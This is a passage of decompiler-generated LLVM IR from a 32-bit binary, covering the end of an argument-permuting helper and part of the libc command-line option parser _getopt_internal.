  %v5_8060161 = add i32 %stack_var_-20.022, %stack_var_-36.023
  %v2_8060168 = mul i32 %v5_8060161, 4
  %v3_8060168 = add i32 %v2_806015e, %v2_8060168
  store i32 %v3_8060168, i32* @ecx, align 4
  %v5_806016f = add i32 %stack_var_-20.022, %v3_80600f1
  store i32 %v5_806016f, i32* %eax.global-to-local, align 4
  %v1_8060173 = inttoptr i32 %v3_8060168 to i32*
  %v2_8060173 = load i32, i32* %v1_8060173, align 4
  store i32 %v2_8060173, i32* %ebx.global-to-local, align 4
  %v2_8060175 = mul i32 %v5_806016f, 4
  %v3_8060175 = add i32 %v2_806015e, %v2_8060175
  store i32 %v3_8060175, i32* %eax.global-to-local, align 4
  %v1_8060178 = inttoptr i32 %v3_8060175 to i32*
  %v2_8060178 = load i32, i32* %v1_8060178, align 4
  store i32 %v2_8060178, i32* %v1_8060173, align 4
  %v0_806017c = load i32, i32* %ebx.global-to-local, align 4
  %v1_806017c = load i32, i32* %eax.global-to-local, align 4
  %v2_806017c = inttoptr i32 %v1_806017c to i32*
  store i32 %v0_806017c, i32* %v2_806017c, align 4
  %v4_806017e = add i32 %stack_var_-20.022, 1
  %v4_8060182.pre = load i32, i32* %ebp.global-to-local, align 4
  %v5_8060186 = icmp slt i32 %v4_806017e, %v4_8060182.pre
  br i1 %v5_8060186, label %dec_label_pc_806015a, label %dec_label_pc_8060188

dec_label_pc_8060188:                             ; preds = %dec_label_pc_806015a, %dec_label_pc_8060182.preheader
  %v4_8060188.lcssa = phi i32 [ %v5_806019034, %dec_label_pc_8060182.preheader ], [ %v4_8060182.pre, %dec_label_pc_806015a ]
  %v5_8060188 = add i32 %v4_8060188.lcssa, %stack_var_-36.023
  store i32 %v3_80600f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060196

dec_label_pc_8060196:                             ; preds = %dec_label_pc_8060188, %dec_label_pc_8060196.lr.ph
  %stack_var_-36.023 = phi i32 [ %stack_var_-36.0.ph33, %dec_label_pc_8060196.lr.ph ], [ %v5_8060188, %dec_label_pc_8060188 ]
  %v2_806019a = sub i32 %v3_80600f1, %stack_var_-36.023
  %v8_806019c = icmp sgt i32 %v3_80600f1, %stack_var_-36.023
  br i1 %v8_806019c, label %dec_label_pc_8060101, label %dec_label_pc_80601a2

dec_label_pc_80601a2:                             ; preds = %dec_label_pc_8060196, %entry, %dec_label_pc_8060154
  %v0_80601a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80601a2 = inttoptr i32 %v0_80601a2 to i32*
  %v2_80601a2 = load i32, i32* %v1_80601a2, align 4
  store i32 %v2_80601a2, i32* %eax.global-to-local, align 4
  %v2_80601a6 = add i32 %v0_80601a2, 24
  %v3_80601a6 = inttoptr i32 %v2_80601a6 to i32*
  %v4_80601a6 = load i32, i32* %v3_80601a6, align 4
  %v5_80601a6 = sub i32 %v2_80601a2, %v4_80601a6
  store i32 %v5_80601a6, i32* %eax.global-to-local, align 4
  store i32 %v2_80601a2, i32* %v3_80601a6, align 4
  %v0_80601ac = load i32, i32* %esi.global-to-local, align 4
  %v1_80601ac = add i32 %v0_80601ac, 20
  %v2_80601ac = inttoptr i32 %v1_80601ac to i32*
  %v3_80601ac = load i32, i32* %v2_80601ac, align 4
  %v5_80601ac = add i32 %v3_80601ac, %v5_80601a6
  store i32 %v5_80601ac, i32* %v2_80601ac, align 4
  %v2_80601b2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80601b2, i32* %ebx.global-to-local, align 4
  ret i32 %v5_80601a6

; uselistorder directives
  uselistorder i32 %v5_80601a6, { 1, 0, 2 }
  uselistorder i32 %v2_806019a, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-36.023, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v4_806017e, { 1, 0 }
  uselistorder i32 %stack_var_-20.022, { 0, 2, 1 }
  uselistorder i32 %v2_806012f.lcssa, { 1, 0 }
  uselistorder i32 %v4_806014e.pre, { 1, 0 }
  uselistorder i32 %v4_806014a, { 1, 0 }
  uselistorder i32 %v5_806019034, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80600ef.pn, { 1, 0, 2 }
  uselistorder i32 %v3_80600f1, { 6, 5, 7, 4, 3, 8, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 9, 4, 5, 6, 1, 7, 8, 0, 10, 11 }
  uselistorder label %dec_label_pc_80601a2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806015a, { 1, 0 }
  uselistorder label %dec_label_pc_8060127, { 1, 0 }
  uselistorder label %dec_label_pc_8060196.lr.ph, { 1, 0 }
}

define i32 @_getopt_internal(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp94 = ptrtoint i32* %arg2 to i32
  %tmp98 = inttoptr i32 %arg3 to i8*
  %stack_var_-16 = alloca i32, align 4
  %v0_80601b7 = load i32, i32* @ebp, align 4
  %v0_80601b8 = load i32, i32* @edi, align 4
  %v0_80601b9 = load i32, i32* @esi, align 4
  %v0_80601ba = load i32, i32* @ebx, align 4
  store i32 %v0_80601ba, i32* %stack_var_-16, align 4
  %v0_80601be = load i32, i32* @global_var_8073fbc.799, align 4
  %v0_80601c3 = load i32, i32* @global_var_8073fb8.224, align 8
  store i32 %v0_80601be, i32* @global_var_807c8ac.800, align 4
  store i32 %v0_80601c3, i32* @global_var_807c8a8.801, align 8
  store i32 %arg4, i32* @esi, align 4
  %v2_80601e0 = load i8, i8* %tmp98, align 1
  %v11_80601e0 = icmp eq i8 %v2_80601e0, 58
  %v1_80601e3 = icmp eq i1 %v11_80601e0, false
  %v0_80601be. = select i1 %v1_80601e3, i32 %v0_80601be, i32 0
  %tmp114 = icmp slt i32 %arg1, 1
  br i1 %tmp114, label %dec_label_pc_80608a7, label %dec_label_pc_80601f8

dec_label_pc_80601f8:                             ; preds = %entry
  store i32 0, i32* @global_var_807c8b0.802, align 16
  %v1_8060202 = icmp eq i32 %v0_80601c3, 0
  br i1 %v1_8060202, label %dec_label_pc_8060211, label %dec_label_pc_8060206

dec_label_pc_8060206:                             ; preds = %dec_label_pc_80601f8
  %v0_8060206 = load i8, i8* @global_var_807c8b5.803, align 1
  %v1_8060206 = icmp eq i8 %v0_8060206, 0
  %v1_806020d = icmp eq i1 %v1_8060206, false
  br i1 %v1_806020d, label %dec_label_pc_806028b, label %dec_label_pc_806021b

dec_label_pc_8060211:                             ; preds = %dec_label_pc_80601f8
  store i32 1, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_806021b

dec_label_pc_806021b:                             ; preds = %dec_label_pc_8060206, %dec_label_pc_8060211
  %v0_806021e = phi i32 [ %v0_80601c3, %dec_label_pc_8060206 ], [ 1, %dec_label_pc_8060211 ]
  store i32 %v0_806021e, i32* @global_var_807c8c0.804, align 64
  store i32 %v0_806021e, i32* @global_var_807c8bc.805, align 4
  store i8* null, i8** @global_var_807c8b8.807, align 8
  %v2_806023c = call i32 @getenv(i32 ptrtoint ([16 x i8]* @global_var_806db28.806 to i32))
  %v1_8060248 = icmp eq i32 %v2_806023c, 0
  %v1_806024a = icmp eq i1 %v1_8060248, false
  %v2_806024a = zext i1 %v1_806024a to i8
  store i8 %v2_806024a, i8* @global_var_807c8b7.808, align 1
  %v2_8060251 = load i8, i8* %tmp98, align 1
  %v10_8060253 = icmp eq i8 %v2_8060251, 45
  %v1_8060255 = icmp eq i1 %v10_8060253, false
  br i1 %v1_8060255, label %dec_label_pc_8060265, label %dec_label_pc_8060257

dec_label_pc_8060257:                             ; preds = %dec_label_pc_806021b
  %v1_8060257 = add i32 %arg3, 1
  store i8 2, i8* @global_var_807c8b6.809, align 2
  %v5_806025f = inttoptr i32 %v1_8060257 to i8*
  br label %dec_label_pc_8060284

dec_label_pc_8060265:                             ; preds = %dec_label_pc_806021b
  %v10_8060265 = icmp eq i8 %v2_8060251, 43
  %v1_8060267 = icmp eq i1 %v10_8060265, false
  br i1 %v1_8060267, label %dec_label_pc_8060276, label %dec_label_pc_8060269

dec_label_pc_8060269:                             ; preds = %dec_label_pc_8060265
  %v5_8060269 = add i32 %arg3, 1
  %v22_8060269 = inttoptr i32 %v5_8060269 to i8*
  store i8 0, i8* @global_var_807c8b6.809, align 2
  br label %dec_label_pc_8060284

dec_label_pc_8060276:                             ; preds = %dec_label_pc_8060265
  %v1_8060276 = icmp eq i1 %v1_806024a, false
  %v1_806027d = zext i1 %v1_8060276 to i8
  store i8 %v1_806027d, i8* @global_var_807c8b6.809, align 2
  br label %dec_label_pc_8060284

dec_label_pc_8060284:                             ; preds = %dec_label_pc_8060269, %dec_label_pc_8060257, %dec_label_pc_8060276
  %v3_806079113163 = phi i32 [ %v5_8060269, %dec_label_pc_8060269 ], [ %v1_8060257, %dec_label_pc_8060257 ], [ %arg3, %dec_label_pc_8060276 ]
  %v3_8060687159 = phi i8* [ %v22_8060269, %dec_label_pc_8060269 ], [ %v5_806025f, %dec_label_pc_8060257 ], [ %tmp98, %dec_label_pc_8060276 ]
  store i8 1, i8* @global_var_807c8b5.803, align 1
  br label %dec_label_pc_806028b

dec_label_pc_806028b:                             ; preds = %dec_label_pc_8060206, %dec_label_pc_8060284
  %v3_806079113 = phi i32 [ %arg3, %dec_label_pc_8060206 ], [ %v3_806079113163, %dec_label_pc_8060284 ]
  %v3_8060687 = phi i8* [ %tmp98, %dec_label_pc_8060206 ], [ %v3_8060687159, %dec_label_pc_8060284 ]
  %v0_806028b = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_806028b = ptrtoint i8* %v0_806028b to i32
  %v1_8060290 = icmp eq i8* %v0_806028b, null
  br i1 %v1_8060290, label %dec_label_pc_806029d, label %dec_label_pc_8060294

dec_label_pc_8060294:                             ; preds = %dec_label_pc_806028b
  %v2_8060294 = load i8, i8* %v0_806028b, align 1
  %v3_8060294 = icmp eq i8 %v2_8060294, 0
  %v1_8060297 = icmp eq i1 %v3_8060294, false
  br i1 %v1_8060297, label %dec_label_pc_8060294.dec_label_pc_8060416_crit_edge, label %dec_label_pc_806029d

dec_label_pc_8060294.dec_label_pc_8060416_crit_edge: ; preds = %dec_label_pc_8060294
  %v0_8060416.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8060416

dec_label_pc_806029d:                             ; preds = %dec_label_pc_8060294, %dec_label_pc_806028b
  %v0_806029d = load i32, i32* @global_var_807c8a8.801, align 8
  %v0_80602a2 = load i32, i32* @global_var_807c8c0.804, align 64
  %v7_80602a8 = icmp sgt i32 %v0_80602a2, %v0_806029d
  br i1 %v7_80602a8, label %dec_label_pc_80602aa, label %dec_label_pc_80602af

dec_label_pc_80602aa:                             ; preds = %dec_label_pc_806029d
  store i32 %v0_806029d, i32* @global_var_807c8c0.804, align 64
  br label %dec_label_pc_80602af

dec_label_pc_80602af:                             ; preds = %dec_label_pc_806029d, %dec_label_pc_80602aa
  %v0_80602f5 = phi i32 [ %v0_80602a2, %dec_label_pc_806029d ], [ %v0_806029d, %dec_label_pc_80602aa ]
  %v0_80602b4 = load i32, i32* @global_var_807c8bc.805, align 4
  %v7_80602ba = icmp sgt i32 %v0_80602b4, %v0_806029d
  br i1 %v7_80602ba, label %dec_label_pc_80602bc, label %dec_label_pc_80602c1

dec_label_pc_80602bc:                             ; preds = %dec_label_pc_80602af
  store i32 %v0_806029d, i32* @global_var_807c8bc.805, align 4
  br label %dec_label_pc_80602c1

dec_label_pc_80602c1:                             ; preds = %dec_label_pc_80602af, %dec_label_pc_80602bc
  %v0_80602cf = phi i32 [ %v0_80602b4, %dec_label_pc_80602af ], [ %v0_806029d, %dec_label_pc_80602bc ]
  %v0_80602c1 = load i8, i8* @global_var_807c8b6.809, align 2
  %v9_80602c1 = icmp eq i8 %v0_80602c1, 1
  %v1_80602c8 = icmp eq i1 %v9_80602c1, false
  br i1 %v1_80602c8, label %dec_label_pc_8060329, label %dec_label_pc_80602ca

dec_label_pc_80602ca:                             ; preds = %dec_label_pc_80602c1
  %v12_80602cf = icmp eq i32 %v0_80602cf, %v0_80602f5
  %.pre77 = sub i32 %v0_80602f5, %v0_806029d
  br i1 %v12_80602cf, label %dec_label_pc_80602ca.dec_label_pc_80602ef_crit_edge, label %dec_label_pc_80602d7

dec_label_pc_80602ca.dec_label_pc_80602ef_crit_edge: ; preds = %dec_label_pc_80602ca
  br label %dec_label_pc_80602ef

dec_label_pc_80602d7:                             ; preds = %dec_label_pc_80602ca
  %v12_80602d7 = icmp eq i32 %.pre77, 0
  br i1 %v12_80602d7, label %dec_label_pc_80602ef, label %dec_label_pc_80602df

dec_label_pc_80602df:                             ; preds = %dec_label_pc_80602d7
  store i32 ptrtoint (i32* @global_var_807c8a8.801 to i32), i32* @edx, align 4
  store i32 %tmp94, i32* @eax, align 4
  %v0_80602e8 = call i32 @exchange()
  %v0_8060307.pre.pre = load i32, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_8060307.preheader

dec_label_pc_80602ef:                             ; preds = %dec_label_pc_80602ca.dec_label_pc_80602ef_crit_edge, %dec_label_pc_80602d7
  %v2_80602f5.pre-phi = phi i32 [ %.pre77, %dec_label_pc_80602ca.dec_label_pc_80602ef_crit_edge ], [ 0, %dec_label_pc_80602d7 ]
  %v12_80602f5 = icmp eq i32 %v2_80602f5.pre-phi, 0
  br i1 %v12_80602f5, label %dec_label_pc_8060307.preheader, label %dec_label_pc_80602f9

dec_label_pc_80602f9:                             ; preds = %dec_label_pc_80602ef
  store i32 %v0_806029d, i32* @global_var_807c8bc.805, align 4
  br label %dec_label_pc_8060307.preheader

dec_label_pc_8060307.preheader:                   ; preds = %dec_label_pc_80602df, %dec_label_pc_80602f9, %dec_label_pc_80602ef
  %v0_8060301.ph = phi i32 [ %v0_806029d, %dec_label_pc_80602ef ], [ %v0_806029d, %dec_label_pc_80602f9 ], [ %v0_8060307.pre.pre, %dec_label_pc_80602df ]
  %v5_8060310148 = icmp slt i32 %v0_8060301.ph, %arg1
  br i1 %v5_8060310148, label %dec_label_pc_8060312, label %dec_label_pc_8060324

dec_label_pc_8060301:                             ; preds = %dec_label_pc_806031e, %dec_label_pc_8060312
  %v1_8060301 = add nsw i32 %v0_8060301149, 1
  store i32 %v1_8060301, i32* @global_var_807c8a8.801, align 8
  %v5_8060310 = icmp slt i32 %v1_8060301, %arg1
  br i1 %v5_8060310, label %dec_label_pc_8060312, label %dec_label_pc_8060324

dec_label_pc_8060312:                             ; preds = %dec_label_pc_8060307.preheader, %dec_label_pc_8060301
  %v0_8060301149 = phi i32 [ %v1_8060301, %dec_label_pc_8060301 ], [ %v0_8060301.ph, %dec_label_pc_8060307.preheader ]
  store i32 %tmp94, i32* @ecx, align 4
  %v2_8060316 = mul i32 %v0_8060301149, 4
  %v3_8060316 = add i32 %v2_8060316, %tmp94
  %v4_8060316 = inttoptr i32 %v3_8060316 to i32*
  %v5_8060316 = load i32, i32* %v4_8060316, align 4
  %v1_8060319 = inttoptr i32 %v5_8060316 to i8*
  %v2_8060319 = load i8, i8* %v1_8060319, align 1
  %v11_8060319 = icmp eq i8 %v2_8060319, 45
  %v1_806031c = icmp eq i1 %v11_8060319, false
  br i1 %v1_806031c, label %dec_label_pc_8060301, label %dec_label_pc_806031e

dec_label_pc_806031e:                             ; preds = %dec_label_pc_8060312
  %v1_806031e = add i32 %v5_8060316, 1
  %v2_806031e = inttoptr i32 %v1_806031e to i8*
  %v3_806031e = load i8, i8* %v2_806031e, align 1
  %v4_806031e = icmp eq i8 %v3_806031e, 0
  br i1 %v4_806031e, label %dec_label_pc_8060301, label %dec_label_pc_8060324

dec_label_pc_8060324:                             ; preds = %dec_label_pc_806031e, %dec_label_pc_8060301, %dec_label_pc_8060307.preheader
  %v0_8060301.lcssa = phi i32 [ %v0_8060301.ph, %dec_label_pc_8060307.preheader ], [ %v1_8060301, %dec_label_pc_8060301 ], [ %v0_8060301149, %dec_label_pc_806031e ]
  store i32 %v0_8060301.lcssa, i32* @global_var_807c8c0.804, align 64
  br label %dec_label_pc_8060329

dec_label_pc_8060329:                             ; preds = %dec_label_pc_80602c1, %dec_label_pc_8060324
  %v1_8060340 = phi i32 [ %v0_806029d, %dec_label_pc_80602c1 ], [ %v0_8060301.lcssa, %dec_label_pc_8060324 ]
  store i32 %v1_8060340, i32* @ebx, align 4
  %v15_806032f = icmp eq i32 %v1_8060340, %arg1
  br i1 %v15_806032f, label %dec_label_pc_806038f, label %dec_label_pc_8060335

dec_label_pc_8060335:                             ; preds = %dec_label_pc_8060329
  store i32 %tmp94, i32* @eax, align 4
  %v2_8060340 = mul i32 %v1_8060340, 4
  %v3_8060340 = add i32 %v2_8060340, %tmp94
  %v4_8060340 = inttoptr i32 %v3_8060340 to i32*
  %v5_8060340 = load i32, i32* %v4_8060340, align 4
  %v10_8060340 = inttoptr i32 %v5_8060340 to i8*
  %v6_8060343 = call i32 @__GI_strcoll(i8* %v10_8060340)
  %v1_806034b = icmp eq i32 %v6_8060343, 0
  %v1_806034d = icmp eq i1 %v1_806034b, false
  br i1 %v1_806034d, label %dec_label_pc_8060335.dec_label_pc_806038f_crit_edge, label %dec_label_pc_806034f

dec_label_pc_8060335.dec_label_pc_806038f_crit_edge: ; preds = %dec_label_pc_8060335
  %v0_806038f.pre = load i32, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_806038f

dec_label_pc_806034f:                             ; preds = %dec_label_pc_8060335
  %v0_806034f = load i32, i32* @ebx, align 4
  %v1_806034f = add i32 %v0_806034f, 1
  %v0_8060352 = load i32, i32* @global_var_807c8c0.804, align 64
  store i32 %v1_806034f, i32* @global_var_807c8a8.801, align 8
  %v0_806035d = load i32, i32* @global_var_807c8bc.805, align 4
  %v12_806035d = icmp eq i32 %v0_806035d, %v0_8060352
  br i1 %v12_806035d, label %dec_label_pc_8060379, label %dec_label_pc_8060365

dec_label_pc_8060365:                             ; preds = %dec_label_pc_806034f
  %v12_8060365 = icmp eq i32 %v0_8060352, %v1_806034f
  br i1 %v12_8060365, label %dec_label_pc_806037f, label %dec_label_pc_8060369

dec_label_pc_8060369:                             ; preds = %dec_label_pc_8060365
  store i32 ptrtoint (i32* @global_var_807c8a8.801 to i32), i32* @edx, align 4
  store i32 %tmp94, i32* @eax, align 4
  %v0_8060372 = call i32 @exchange()
  br label %dec_label_pc_806037f

dec_label_pc_8060379:                             ; preds = %dec_label_pc_806034f
  store i32 %v1_806034f, i32* @global_var_807c8bc.805, align 4
  br label %dec_label_pc_806037f

dec_label_pc_806037f:                             ; preds = %dec_label_pc_8060365, %dec_label_pc_8060369, %dec_label_pc_8060379
  store i32 %arg1, i32* @global_var_807c8c0.804, align 64
  store i32 %arg1, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_806038f

dec_label_pc_806038f:                             ; preds = %dec_label_pc_8060335.dec_label_pc_806038f_crit_edge, %dec_label_pc_8060329, %dec_label_pc_806037f
  %v0_80603db = phi i32 [ %v0_806038f.pre, %dec_label_pc_8060335.dec_label_pc_806038f_crit_edge ], [ %v1_8060340, %dec_label_pc_8060329 ], [ %arg1, %dec_label_pc_806037f ]
  %v15_8060394 = icmp eq i32 %v0_80603db, %arg1
  %v1_8060398 = icmp eq i1 %v15_8060394, false
  br i1 %v1_8060398, label %dec_label_pc_80603b5, label %dec_label_pc_806039a

dec_label_pc_806039a:                             ; preds = %dec_label_pc_806038f
  %v0_806039a = load i32, i32* @global_var_807c8bc.805, align 4
  %v1_806039f = load i32, i32* @global_var_807c8c0.804, align 64
  %v12_806039f = icmp eq i32 %v0_806039a, %v1_806039f
  br i1 %v12_806039f, label %dec_label_pc_80608a7, label %dec_label_pc_80603ab

dec_label_pc_80603ab:                             ; preds = %dec_label_pc_806039a
  store i32 %v0_806039a, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_80608a7

dec_label_pc_80603b5:                             ; preds = %dec_label_pc_806038f
  store i32 %tmp94, i32* @ecx, align 4
  %v2_80603b9 = mul i32 %v0_80603db, 4
  %v3_80603b9 = add i32 %v2_80603b9, %tmp94
  %v4_80603b9 = inttoptr i32 %v3_80603b9 to i32*
  %v5_80603b9 = load i32, i32* %v4_80603b9, align 4
  %v1_80603bc = inttoptr i32 %v5_80603b9 to i8*
  %v2_80603bc = load i8, i8* %v1_80603bc, align 1
  %v11_80603bc = icmp eq i8 %v2_80603bc, 45
  %v1_80603bf = icmp eq i1 %v11_80603bc, false
  br i1 %v1_80603bf, label %dec_label_pc_80603c8, label %dec_label_pc_80603c1

dec_label_pc_80603c1:                             ; preds = %dec_label_pc_80603b5
  %v1_80603c1 = add i32 %v5_80603b9, 1
  %v2_80603c1 = inttoptr i32 %v1_80603c1 to i8*
  %v3_80603c1 = load i8, i8* %v2_80603c1, align 1
  %v4_80603c1 = zext i8 %v3_80603c1 to i32
  %v6_80603c1 = and i32 %tmp94, -256
  %v7_80603c1 = or i32 %v4_80603c1, %v6_80603c1
  store i32 %v7_80603c1, i32* @ecx, align 4
  %v4_80603c4 = icmp eq i8 %v3_80603c1, 0
  %v1_80603c6 = icmp eq i1 %v4_80603c4, false
  br i1 %v1_80603c6, label %dec_label_pc_80603eb, label %dec_label_pc_80603c8

dec_label_pc_80603c8:                             ; preds = %dec_label_pc_80603c1, %dec_label_pc_80603b5
  %v0_80603c8 = load i8, i8* @global_var_807c8b6.809, align 2
  %v1_80603c8 = icmp eq i8 %v0_80603c8, 0
  br i1 %v1_80603c8, label %dec_label_pc_80608a7, label %dec_label_pc_80603d5

dec_label_pc_80603d5:                             ; preds = %dec_label_pc_80603c8
  store i32 %v5_80603b9, i32* @global_var_807c8b0.802, align 16
  %v1_80603db = add i32 %v0_80603db, 1
  store i32 %v1_80603db, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_80608aa

dec_label_pc_80603eb:                             ; preds = %dec_label_pc_80603c1
  %v0_80603ed = load i32, i32* @esi, align 4
  %v1_80603ed = icmp eq i32 %v0_80603ed, 0
  br i1 %v1_80603ed, label %dec_label_pc_806040d, label %dec_label_pc_8060405

dec_label_pc_80603f3:                             ; preds = %dec_label_pc_80604bf
  br label %dec_label_pc_8060526

dec_label_pc_8060405:                             ; preds = %dec_label_pc_80603eb
  %v10_8060407 = icmp eq i8 %v3_80603c1, 45
  %v1_806040a = zext i1 %v10_8060407 to i32
  br label %dec_label_pc_806040d

dec_label_pc_806040d:                             ; preds = %dec_label_pc_80603eb, %dec_label_pc_8060405
  %v1_806040d = phi i32 [ 0, %dec_label_pc_80603eb ], [ %v1_806040a, %dec_label_pc_8060405 ]
  %v3_806040d = add i32 %v1_806040d, %v1_80603c1
  %v1_8060411 = inttoptr i32 %v3_806040d to i8*
  store i8* %v1_8060411, i8** @global_var_807c8b8.807, align 8
  br label %dec_label_pc_8060416

dec_label_pc_8060416:                             ; preds = %dec_label_pc_8060294.dec_label_pc_8060416_crit_edge, %dec_label_pc_806040d
  %v0_806046b56 = phi i8* [ %v0_806028b, %dec_label_pc_8060294.dec_label_pc_8060416_crit_edge ], [ %v1_8060411, %dec_label_pc_806040d ]
  %v5_8060433 = phi i32 [ %v1_806028b, %dec_label_pc_8060294.dec_label_pc_8060416_crit_edge ], [ %v3_806040d, %dec_label_pc_806040d ]
  %v0_8060416 = phi i32 [ %v0_8060416.pre, %dec_label_pc_8060294.dec_label_pc_8060416_crit_edge ], [ %v0_80603ed, %dec_label_pc_806040d ]
  %v1_8060416 = icmp eq i32 %v0_8060416, 0
  br i1 %v1_8060416, label %dec_label_pc_8060778, label %dec_label_pc_806041e

dec_label_pc_806041e:                             ; preds = %dec_label_pc_8060416
  %v0_806041e = load i32, i32* @global_var_807c8a8.801, align 8
  %v2_806042c = mul i32 %v0_806041e, 4
  %v3_806042c = add i32 %v2_806042c, %tmp94
  %v4_806042c = inttoptr i32 %v3_806042c to i32*
  %v5_806042c = load i32, i32* %v4_806042c, align 4
  store i32 %v5_806042c, i32* @ecx, align 4
  %v1_8060433 = add i32 %v5_806042c, 1
  %v2_8060433 = inttoptr i32 %v1_8060433 to i8*
  %v3_8060433 = load i8, i8* %v2_8060433, align 1
  %v4_8060433 = zext i8 %v3_8060433 to i32
  %v6_8060433 = and i32 %v5_8060433, -256
  %v7_8060433 = or i32 %v4_8060433, %v6_8060433
  %v10_806043a = icmp eq i8 %v3_8060433, 45
  br i1 %v10_806043a, label %dec_label_pc_806046b, label %dec_label_pc_806043e

dec_label_pc_806043e:                             ; preds = %dec_label_pc_806041e
  %v4_806043e = icmp eq i32 %arg6, 0
  br i1 %v4_806043e, label %dec_label_pc_8060778, label %dec_label_pc_8060449

dec_label_pc_8060449:                             ; preds = %dec_label_pc_806043e
  %v1_8060449 = add i32 %v5_806042c, 2
  %v2_8060449 = inttoptr i32 %v1_8060449 to i8*
  %v3_8060449 = load i8, i8* %v2_8060449, align 1
  %v4_8060449 = icmp eq i8 %v3_8060449, 0
  %v1_806044d = icmp eq i1 %v4_8060449, false
  br i1 %v1_806044d, label %dec_label_pc_806046b, label %dec_label_pc_806044f

dec_label_pc_806044f:                             ; preds = %dec_label_pc_8060449
  %v4_8060451 = sext i8 %v3_8060433 to i32
  %v0_806045b.cast = inttoptr i32 %v3_806079113 to i8*
  %v5_806045b = call i32 @__GI_strchr(i8* %v0_806045b.cast, i32 %v4_8060451)
  %v1_8060463 = icmp eq i32 %v5_806045b, 0
  %v1_8060465 = icmp eq i1 %v1_8060463, false
  br i1 %v1_8060465, label %dec_label_pc_8060778, label %dec_label_pc_806044f.dec_label_pc_806046b_crit_edge

dec_label_pc_806044f.dec_label_pc_806046b_crit_edge: ; preds = %dec_label_pc_806044f
  %v0_806046b.pre = load i8*, i8** @global_var_807c8b8.807, align 4
  br label %dec_label_pc_806046b

dec_label_pc_806046b:                             ; preds = %dec_label_pc_806044f.dec_label_pc_806046b_crit_edge, %dec_label_pc_8060449, %dec_label_pc_806041e
  %v4_806047a59 = phi i32 [ %v5_806045b, %dec_label_pc_806044f.dec_label_pc_806046b_crit_edge ], [ %v7_8060433, %dec_label_pc_8060449 ], [ %v7_8060433, %dec_label_pc_806041e ]
  %v3_8060715 = phi i8* [ %v0_806046b.pre, %dec_label_pc_806044f.dec_label_pc_806046b_crit_edge ], [ %v0_806046b56, %dec_label_pc_8060449 ], [ %v0_806046b56, %dec_label_pc_806041e ]
  %v1_806046b = ptrtoint i8* %v3_8060715 to i32
  store i32 %v1_806046b, i32* @edx, align 4
  store i32 %v1_806046b, i32* @edi, align 4
  %v2_806047a132 = load i8, i8* %v3_8060715, align 1
  %v3_806047a133 = zext i8 %v2_806047a132 to i32
  %v5_806047a134 = and i32 %v4_806047a59, -256
  %v6_806047a135 = or i32 %v3_806047a133, %v5_806047a134
  store i32 %v6_806047a135, i32* @eax, align 4
  %v4_806047c136 = icmp eq i8 %v2_806047a132, 0
  br i1 %v4_806047c136, label %dec_label_pc_806051a.preheader, label %dec_label_pc_8060480

dec_label_pc_8060479:                             ; preds = %dec_label_pc_8060480
  %v1_8060479 = add i32 %storemerge137, 1
  store i32 %v1_8060479, i32* @edi, align 4
  %v1_806047a = inttoptr i32 %v1_8060479 to i8*
  %v2_806047a = load i8, i8* %v1_806047a, align 1
  %v3_806047a = zext i8 %v2_806047a to i32
  %v5_806047a = and i32 %v6_806047a139, -256
  %v6_806047a = or i32 %v3_806047a, %v5_806047a
  store i32 %v6_806047a, i32* @eax, align 4
  %v4_806047c = icmp eq i8 %v2_806047a, 0
  br i1 %v4_806047c, label %dec_label_pc_806051a.preheader, label %dec_label_pc_8060480

dec_label_pc_8060480:                             ; preds = %dec_label_pc_806046b, %dec_label_pc_8060479
  %v6_806047a139 = phi i32 [ %v6_806047a, %dec_label_pc_8060479 ], [ %v6_806047a135, %dec_label_pc_806046b ]
  %v2_806047a138 = phi i8 [ %v2_806047a, %dec_label_pc_8060479 ], [ %v2_806047a132, %dec_label_pc_806046b ]
  %storemerge137 = phi i32 [ %v1_8060479, %dec_label_pc_8060479 ], [ %v1_806046b, %dec_label_pc_806046b ]
  %v10_8060480 = icmp eq i8 %v2_806047a138, 61
  %v1_8060482 = icmp eq i1 %v10_8060480, false
  br i1 %v1_8060482, label %dec_label_pc_8060479, label %dec_label_pc_806051a.preheader

dec_label_pc_806051a.preheader:                   ; preds = %dec_label_pc_8060479, %dec_label_pc_8060480, %dec_label_pc_806046b
  %storemerge.lcssa = phi i32 [ %v1_806046b, %dec_label_pc_806046b ], [ %storemerge137, %dec_label_pc_8060480 ], [ %v1_8060479, %dec_label_pc_8060479 ]
  %v0_806051a26 = load i32, i32* @esi, align 4
  %v1_806051a27 = inttoptr i32 %v0_806051a26 to i32*
  %v2_806051a28 = load i32, i32* %v1_806051a27, align 4
  store i32 %v2_806051a28, i32* @ebx, align 4
  %v1_806051c29 = icmp eq i32 %v2_806051a28, 0
  %v1_806051e36 = icmp eq i1 %v1_806051c29, false
  br i1 %v1_806051e36, label %dec_label_pc_80604a6.lr.ph, label %dec_label_pc_8060520

dec_label_pc_80604a6.lr.ph:                       ; preds = %dec_label_pc_806051a.preheader
  %v4_80604e8 = icmp eq i32 %arg6, 0
  %v1_80604ed = icmp eq i1 %v4_80604e8, false
  br label %dec_label_pc_80604a6

dec_label_pc_80604a6:                             ; preds = %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge, %dec_label_pc_80604a6.lr.ph
  %v0_80604a6 = phi i32 [ %storemerge.lcssa, %dec_label_pc_80604a6.lr.ph ], [ %v0_80604a6.pre, %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge ]
  %v2_806051a41 = phi i32 [ %v2_806051a28, %dec_label_pc_80604a6.lr.ph ], [ %v2_806051a, %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge ]
